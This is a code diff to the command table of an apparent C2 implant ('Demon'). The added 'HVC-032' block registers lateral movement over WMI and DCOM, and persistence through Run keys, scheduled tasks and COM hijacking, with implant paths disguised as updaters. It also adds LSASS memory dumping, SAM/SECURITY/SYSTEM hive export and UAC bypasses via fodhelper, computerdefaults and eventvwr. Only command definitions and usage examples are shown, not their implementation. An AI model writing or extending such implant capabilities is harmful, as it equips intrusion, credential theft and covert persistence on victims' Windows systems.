@@ -757,6 +757,130 @@ std::vector<DemonCommands::Command_t> DemonCommands::DemonCommandList = {
                     },
                 },
         },
+        /* ---- HVC-032 new commands ---- */
+        {
+            .CommandString  = "wmi",
+            .Description    = "lateral movement via WMI Win32_Process::Create",
+            .Usage          = "exec <target> <command>",
+            .Example        = R"(exec 192.168.1.10 calc.exe)",
+            .Module         = true,
+
+            .SubCommands    =
+            {
+                {
+                    .CommandString  = "exec",
+                    .Description    = "execute a command on a remote host via WMI",
+                    .Behavior       = BEHAVIOR_API_ONLY,
+                    .Usage          = "<target> <command>",
+                    .Example        = R"(192.168.1.10 calc.exe)",
+                },
+            },
+        },
+        {
+            .CommandString  = "dcom",
+            .Description    = "lateral movement via DCOM (MMC20 or ShellWindows)",
+            .Usage          = "exec <target> <command> [/method mmc20|shellwindows]",
+            .Example        = R"(exec 192.168.1.10 calc.exe /method mmc20)",
+            .Module         = true,
+
+            .SubCommands    =
+            {
+                {
+                    .CommandString  = "exec",
+                    .Description    = "execute a command on a remote host via DCOM",
+                    .Behavior       = BEHAVIOR_API_ONLY,
+                    .Usage          = "<target> <command> [/method mmc20|shellwindows]",
+                    .Example        = R"(192.168.1.10 calc.exe /method shellwindows)",
+                },
+            },
+        },
+        {
+            .CommandString  = "persist",
+            .Description    = "install or remove persistence mechanisms",
+            .Usage          = "reg|schtask|com|remove (args)",
+            .Example        = R"(reg HKCU_RunKey C:\implant.exe)",
+            .Module         = true,
+
+            .SubCommands    =
+            {
+                {
+                    .CommandString  = "reg",
+                    .Description    = "add a Run-key registry persistence entry",
+                    .Behavior       = BEHAVIOR_API_ONLY,
+                    .Usage          = "<name> <value> [/system]",
+                    .Example        = R"(Updater C:\Windows\Temp\svc.exe)",
+                },
+                {
+                    .CommandString  = "schtask",
+                    .Description    = "create a scheduled task persistence entry",
+                    .Behavior       = BEHAVIOR_PROCESS_CREATION,
+                    .Usage          = "<name> <command> <trigger>",
+                    .Example        = R"(WindowsUpdate C:\implant.exe logon)",
+                },
+                {
+                    .CommandString  = "com",
+                    .Description    = "hijack a COM CLSID for persistence (HKCU)",
+                    .Behavior       = BEHAVIOR_API_ONLY,
+                    .Usage          = "<clsid> <dll_path>",
+                    .Example        = R"({B5F8350B-0548-48B1-A6EE-88BD00B4A5E7} C:\implant.dll)",
+                },
+                {
+                    .CommandString  = "remove",
+                    .Description    = "remove a persistence entry",
+                    .Behavior       = BEHAVIOR_API_ONLY,
+                    .Usage          = "reg|schtask|com <name>",
+                    .Example        = "reg Updater",
+                },
+            },
+        },
+        {
+            .CommandString  = "creds",
+            .Description    = "credential access (LSASS dump or SAM hive export)",
+            .Usage          = "lsass [/filename <path>] | sam",
+            .Example        = "lsass",
+            .Module         = true,
+
+            .SubCommands    =
+            {
+                {
+                    .CommandString  = "lsass",
+                    .Description    = "dump LSASS memory to a temp file via PssCaptureSnapshot/MiniDumpWriteDump",
+                    .Behavior       = BEHAVIOR_API_ONLY,
+                    .Usage          = "[/filename <path>]",
+                    .Example        = "/filename C:\\Windows\\Temp\\lsass.dmp",
+                },
+                {
+                    .CommandString  = "sam",
+                    .Description    = "export SAM, SECURITY and SYSTEM hives to temp files (requires SeBackupPrivilege)",
+                    .Behavior       = BEHAVIOR_API_ONLY,
+                },
+            },
+        },
+        {
+            .CommandString  = "privesc",
+            .Description    = "privilege escalation techniques",
+            .Usage          = "uac <method> <command>",
+            .Example        = "uac fodhelper cmd.exe",
+            .Module         = true,
+
+            .SubCommands    =
+            {
+                {
+                    .CommandString  = "uac",
+                    .Description    = "bypass UAC via registry class hijack (fodhelper, computerdefaults, eventvwr)",
+                    .Behavior       = BEHAVIOR_PROCESS_CREATION,
+                    .Usage          = "<method> <command>",
+                    .Example        = "fodhelper cmd.exe",
+                    .Options        =
+                    {
+                        "fodhelper        - hijacks ms-settings via fodhelper.exe",
+                        "computerdefaults - hijacks ms-settings via computerdefaults.exe",
+                        "eventvwr         - hijacks HKCU\\Software\\Classes\\mscfile via eventvwr.exe",
+                    },
+                },
+            },
+        },
+        /* ---- end HVC-032 ---- */
         {
             .CommandString  = "luid",
             .Description    = "get current logon ID",
